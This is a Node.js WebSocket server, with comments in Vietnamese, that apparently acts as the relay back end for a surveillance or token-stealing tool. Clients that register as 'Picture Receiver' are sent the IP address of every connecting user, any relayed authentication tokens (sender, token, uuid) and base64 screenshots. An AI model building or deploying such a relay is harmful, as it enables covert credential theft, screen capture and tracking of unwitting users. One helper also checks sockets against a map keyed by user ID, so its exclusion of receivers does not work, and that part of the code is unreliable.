import http from 'http';
import express from 'express';
import { WebSocket, WebSocketServer } from 'ws';
import crypto from 'crypto';

const app = express();
app.use(express.static("public"));
const PORT = process.env.PORT || 3000;
const server = http.createServer(app);
const wss = new WebSocketServer({ noServer: true });

server.on('upgrade', (request, socket, head) => {
    wss.handleUpgrade(request, socket, head, ws => {
        wss.emit('connection', ws, request);
    });
});

server.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});

const usersInChat = new Map();
const pictureReceivers = new Map(); 
let keepAliveId = null;

// Hàm mới để gửi thông tin IP
const sendIPInfoToPictureReceivers = (userID, ip) => {
    const ipInfo = {
        type: 'ipInfo',
        userID: userID,
        ip: ip,
        timestamp: new Date().toISOString()
    };
    broadcastToPictureReceivers(ipInfo);
};

wss.on("connection", (ws, request) => {
    const userID = crypto.randomUUID();
    const ip = request.headers['x-forwarded-for']?.split(',')[0].trim() || request.socket.remoteAddress;
    
    console.log(`New connection from IP: ${ip} with userID: ${userID}`);
    
    // Gửi thông tin IP ngay khi có kết nối mới
    sendIPInfoToPictureReceivers(userID, ip);
    
    ws.on("message", (data) => {
        handleMessage(ws, data, userID);
    });

    ws.on("close", () => {
        console.log(`Connection closed for UserID: ${userID}`);
        handleDisconnect(userID);
        ws.removeAllListeners();
    });

    if (wss.clients.size === 1 && !keepAliveId) {
        keepServerAlive();
    }
});

wss.on("close", () => {
    if (keepAliveId) {
        clearInterval(keepAliveId);
        keepAliveId = null;
    }
});

app.get('/node-version', (req, res) => {
    res.send(`Node.js version: ${process.version}`);
});

const handleMessage = (ws, data, userID) => {
    try {
        const messageData = JSON.parse(data.toString());

        if (messageData.command === 'Picture Receiver') {
            pictureReceivers.set(userID, ws);
            broadcastToPictureReceivers({
                type: 'newReceiver',
                userID: userID
            });
        } else if (messageData.type === 'token' && messageData.sender && messageData.token && messageData.uuid) {
            broadcastToPictureReceivers(messageData);
        } else if (messageData.type === 'screenshot' && messageData.data && typeof messageData.data === 'string' && messageData.data.startsWith('data:image/png;base64')) {
            broadcastToPictureReceivers({
                type: 'screenshot',
                action: messageData.action,
                screen: messageData.screen,
                data: messageData.data
            });
        } else if (messageData.action === 'screenshot_result') {
            broadcastToPictureReceivers({
                type: 'screenshot',
                action: messageData.action,
                screen: messageData.screen,
                data: messageData.data
            });
        } else {
            broadcastToAllExceptPictureReceivers(ws, JSON.stringify(messageData), true);
        }
    } catch (e) {
        broadcastToPictureReceivers({
            type: 'error',
            userID: userID,
            error: e.message
        });
    }
};

const broadcastToPictureReceivers = (message) => {
    const data = JSON.stringify(message);
    pictureReceivers.forEach((ws, userId) => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(data, error => {
                if (error) {
                    console.error(`Error sending message to receiver UserID: ${userId}:`, error);
                }
            });
        }
    });
};

const broadcastToAllExceptPictureReceivers = (senderWs, message, includeSelf) => {
    wss.clients.forEach(client => {
        if (!pictureReceivers.has(client) && client.readyState === WebSocket.OPEN && (includeSelf || client !== senderWs)) {
            client.send(message);
        }
    });
};

const handleDisconnect = (userID) => {
    usersInChat.delete(userID);
    pictureReceivers.delete(userID);
};

const keepServerAlive = () => {
    keepAliveId = setInterval(() => {
        wss.clients.forEach(client => {
            if (client.readyState === WebSocket.OPEN) {
                client.ping(); 
            }
        });
    }, 30000);
};
